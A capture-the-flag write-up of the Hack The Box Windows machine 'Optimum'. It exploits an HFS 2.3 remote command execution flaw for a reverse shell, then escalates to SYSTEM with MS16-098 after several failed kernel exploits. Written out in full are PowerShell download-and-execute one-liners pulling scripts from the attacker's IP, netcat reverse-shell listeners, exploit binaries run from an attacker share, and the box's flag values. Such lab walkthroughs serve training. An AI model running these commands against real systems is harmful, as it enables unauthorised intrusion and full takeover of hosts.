---
layout: single
title: Optimum - Hack The Box
excerpt: "N/A"
date: 2019-04-14
classes: wide
header:
  teaser: /assets/images/htb-writeup-optimum/optimum_logo.png
  teaser_home_page: true
  icon: /assets/images/windows.png
  unreleased: false
categories:
  - hackthebox
tags:  
  - windows
  - easy
  - http
  - hfs
  - ms16-098
---

![](/assets/images/htb-writeup-optimum/optimum_logo.png){: style="float: right; width: 200px; margin-left: 2em"}

N/A<br><br><br><br><br><br><br>

----------------


# USER
## Enumeration
```bash
[root:/git/htb/optimum]# nmap -Pn -n -sCV 10.10.10.8 --open                                                                       (master✱)
  PORT   STATE SERVICE VERSION
  80/tcp open  http    HttpFileServer httpd 2.3
  |_http-server-header: HFS 2.3
  |_http-title: HFS /
  Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### DIRB:
```bash
-
```

### NIKTO:
```bash
-
```

Visiting the URL we quickly see valuable server information:

```bash
> Server information
> HttpFileServer 2.3
> Server time: 8/3/2021 7:12:34 μμ
> Server uptime: 00:09:16
```

```bash
[root:/git/htb/optimum]# searchsploit hfs 2.3                                                                                     (master✱)
----------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                                | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                             | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                        | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                        | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                   | windows/webapps/34852.txt
----------------------------------------------------------------------------------------------------------- ---------------------------------
```

The python script `windows/remote/39161.py` looks promising, lets try it out.

- Host a webserver on port 80, containing nc.exe
- Change the script's local IP and port
- Execute!

```bash
[root:/git/htb/optimum]# python 39161.py 10.10.10.8 80

[root:/srv/pub-share]# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.8 - - [02/Mar/2021 10:39:29] "GET /nc.exe HTTP/1.1" 200 -
10.10.10.8 - - [02/Mar/2021 10:39:29] "GET /nc.exe HTTP/1.1" 200 -
10.10.10.8 - - [02/Mar/2021 10:39:29] "GET /nc.exe HTTP/1.1" 200 -
10.10.10.8 - - [02/Mar/2021 10:39:29] "GET /nc.exe HTTP/1.1" 200 -

[root:/git/htb/optimum]# rlwrap nc -lvnp 4499                                                                                     (master✱)
  listening on [any] 4499 ...
  connect to [10.10.14.8] from (UNKNOWN) [10.10.10.8] 49173
  Microsoft Windows [Version 6.3.9600]
  (c) 2013 Microsoft Corporation. All rights reserved.

  C:\Users\kostas\Desktop> type user.txt.txt
    d0c39409d7b994a9a1389ebf38ef5f73
```

----------------
<br><br>
# ROOT
## Enumeration

Run Watson exploit suggester.

```bash
C:\Users\kostas\Desktop> \\10.10.14.8\pub-share\WatsonNet4AnyCPU.exe
    __    __      _
   / / /\ \ \__ _| |_ ___  ___  _ __
   \ \/  \/ / _` | __/ __|/ _ \| '_ \
    \  /\  / (_| | |_\__ \ (_) | | | |
     \/  \/ \__,_|\__|___/\___/|_| |_|

                             v0.1

                    Sherlock sucks...
                     @_RastaMouse

[*] OS Build number: 9600
[*] CPU Address Width: 64
[*] Process IntPtr Size: 8
[*] Using Windows path: C:\WINDOWS\System32

[*] Appears vulnerable to MS15-051
  [>] Description: An EoP exists due to improper object handling in the win32k.sys kernel mode driver.
  [>] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms15_051_client_copy_image.rb
  [>] Notes: None.

[*] Appears vulnerable to MS15-076
  [>] Description: Local DCOM DCE/RPC connections can be reflected back to a listening TCP socket allowing access to an NTLM authentication challenge for LocalSystem, which can be replayed to the local DCOM activation service to elevate privileges.
  [>] Exploit: https://www.exploit-db.com/exploits/37768/
  [>] Notes: None.

[*] Appears vulnerable to MS15-078
  [>] Description: An EoP exists due to a pool based buffer overflow in the atmfd.dll driver when parsing a malformed font.
  [>] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms15_078_atmfd_bof.rb
  [>] Notes: None.

[*] Appears vulnerable to MS16-032
  [>] Description: An EoP exists due to a lack of sanitization of standard handles in Windows' Secondary Logon Service.
  [>] Exploit: https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1
  [>] Notes: None.

[*] Appears vulnerable to MS16-034
  [>] Description: An EoP exist when the Windows kernel-mode driver fails to properly handle objects in memory.
  [>] Exploit: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034
  [>] Notes: None.

[*] Finished. Found 5 vulns :)
```

Lets try the exploits.

### MS15-076:
"local DCOM activation service to elevate privileges" sound promising as we want to escalate.<br>
Reading about the exploit it's only tested on x64/x86 Windows 7/8.1, this box is Win2012 - lets try it anyway.

```bash
C:\tmp> //10.10.14.8/pub-share/ms15-076/Trebuchet.exe C:\Users\Administrator\Desktop\root.txt C:\tmp\test.txt
  [!] Error reading initial file!
```

However, reading a file we know exists work:
```bash
  C:\tmp> //10.10.14.8/pub-share/ms15-076/Trebuchet.exe C:\Users\kostas\Desktop\user.txt.txt C:\tmp\test.txt
    [+] Loaded in 32 bytes.
    [+] Getting out our toolbox...
    Junction created for C:\Windows\temp\EQGJWGJW <<===>> C:\users\public\libraries\Sym\
    [+] Waiting for CreateSymlink to close...
    Opened Link \RPC Control\ (2) -> \??\C:\tmp\test.txt: 000000A8
    Holding Symlink open for 10 seconds...
    [+] Cleaning Up!
  C:\tmp> type test.txt
    d0c39409d7b994a9a1389ebf38ef5f73
```

### MS15-051:
```bash
C:\tmp> //10.10.14.8/pub-share/Taihou64.exe whoami
  --- no response ---
C:\tmp> //10.10.14.8/pub-share/ms15-051x64.exe
[#] ms15-051 fixed by zcgonvh
[#] usage: ms15-051 command
[#] eg: ms15-051 "whoami /all"

C:\tmp> //10.10.14.8/pub-share/ms15-051x64.exe "whoami"
  --- no response ---
```

### MS16-032:
```bash
C:\tmp> //10.10.14.8/pub-share/ms16-032.exe
Gathering thread handles
Done, got 3 handles
System Token: 0000000000000158
Couldn't open process token 5

The .exe doesn't work, so lets try the .ps1:
C:\tmp> powershell.exe IEX(New-Object Net.Webclient).downloadString('http://10.10.14.8/ps-rev.ps1')

[root:/srv/pub-share]# python3 -m http.server 80
  Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
  10.10.10.8 - - [02/Mar/2021 12:46:07] "GET /ps-rev.ps1 HTTP/1.1" 200 -

[root:/git/htb/optimum]# rlwrap nc -lvnp 4488                                                                                     (master✱)
  listening on [any] 4488 ...
  connect to [10.10.14.8] from (UNKNOWN) [10.10.10.8] 49259
  PS C:\Users\kostas\Desktop> whoami
    optimum\kostas
```

**Summary:**
- ms15-051 - nope
- ms15-076 - nope
- ms15-078 - not checked
- ms16-032 - nope
- ms16-034 - not checked


The exploits found by Watson doesn't seem to give anything, so lets go back one step and try windows-expoit-suggester instead.

```bash
[root:/srv/pub-share]# python /opt/windows-exploit-suggester.py --update
  [*] initiating winsploit version 3.3...
  [+] writing to file 2021-03-02-mssb.xls
  [*] done

[root:/git/htb/optimum]# python /opt/windows-exploit-suggester.py --database 2021-03-02-mssb.xls --systeminfo systeminfo.txt      (master✱)
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*] there are now 246 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2012 R2 64-bit'
[*]
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*]
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*]
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]   https://github.com/foxglovesec/RottenPotato
[*]   https://github.com/Kevin-Robertson/Tater
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*]
[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
[*]
[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
[*]
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
[*]
[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
[*]
[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
[*]
[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
[*]
[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC
[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC
[*]
[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)
[*]
[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC
[*]
[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
[*]
[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
[*]
[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical
[*]   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow
[*]
[E] MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass (3050514) - Important
[*]   https://www.exploit-db.com/exploits/37052/ -- Windows - CNG.SYS Kernel Security Feature Bypass PoC (MS15-052), PoC
[*]
[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
[*]
[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC
[*]
[E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important
[*]   http://www.exploit-db.com/exploits/35661/ -- Windows 8.1 (32/64 bit) - Privilege Escalation (ahcache.sys/NtApphelpCacheControl), PoC
[*]
[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
[*]
[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC
[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF
[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
[*]
[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important
[*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution 'Sandworm' Exploit (MS14-060), PoC
[*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF
[*]
[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
[*]
[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
[*] done
```

Starting to test exploits from the top;

### MS16-135:
```bash
C:\Users\kostas\Desktop> powershell.exe IEX(New-Object Net.Webclient).downloadString('http://10.10.14.8/MS16-135.ps1')
      _____ _____ ___   ___     ___   ___ ___
    |     |   __|_  | |  _|___|_  | |_  |  _|
    | | | |__   |_| |_| . |___|_| |_|_  |_  |
    |_|_|_|_____|_____|___|   |_____|___|___|

                        [by b33f -> @FuzzySec]


  [!] Target architecture is x64 only!
```

### MS16-098:
```bash
C:\Users\kostas\Desktop> //10.10.14.8/pub-share/ms16-098.exe
  Microsoft Windows [Version 6.3.9600]
  (c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop> whoami
  nt authority\system

C:\Users\kostas\Desktop> type C:\Users\Administrator\Desktop\root.txt
  51ed1b36553c8461f4552c2e92b3eeed
```
